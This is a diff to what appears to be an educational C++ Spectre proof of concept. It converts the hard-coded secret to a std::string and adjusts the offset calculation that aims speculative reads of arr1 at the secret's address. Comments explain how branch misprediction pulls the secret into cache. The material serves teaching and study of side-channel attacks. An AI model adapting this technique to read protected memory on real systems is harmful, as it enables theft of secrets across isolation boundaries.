@@ -27,7 +27,7 @@ unsigned int arr1_size = 16;    //Here I have made only the first 16 elements of
 uint8_t arr1[160] = {16, 93, 45, 96, 4, 8, 41, 203, 15, 49, 56, 59, 62, 97, 112, 186};  //Random values for the accessible function
 uint8_t arr2[256 * 512];    //Here array2 values are accessed via the arr1 values throught the function... can be thought as property  fetched for every user in db
 
-char *secret = "Sachin@jafka#563";  /* RETRIEVING THIS SECRET KEY IS THE GOAL OF THE ATTACKER */
+string secret = "Sachin@jafka#563";  /* RETRIEVING THIS SECRET KEY IS THE GOAL OF THE ATTACKER */
 
 int fetch_function(size_t idx)
 {
@@ -146,11 +146,11 @@ void readMemoryByte(size_t target_idx)
 int main()
 {
     /* Show the address of the secret key , for demonstration purpose*/
-    cout << "In this example, the SECRET_KEY \"" << secret << "\" is stored at address: " << &secret << "\n";
+    cout << "In this example, the SECRET_KEY \"" << secret.c_str() << "\" is stored at address: " << &secret << "\n";
 
-    size_t target_idx = (size_t)(secret - (char *)arr1); /* Its value is the difference in the address of SECRET KEY and arr1*/
+    size_t target_idx = (size_t)(secret.c_str() - (char *)arr1); /* Its value is the difference in the address of SECRET KEY and arr1*/
     /* So that when branch predictor fetches arr[target_idx] in attacking iterations (mispredictions), it prefetches arr1 + target_idx, which leads to prefetching of SECRET KEY in the cache memory */
-    int len = strlen(secret);
+    int len = secret.length();
 
     //set all values of array 2 as 1
     for (size_t i = 0; i < sizeof(arr2); i++)
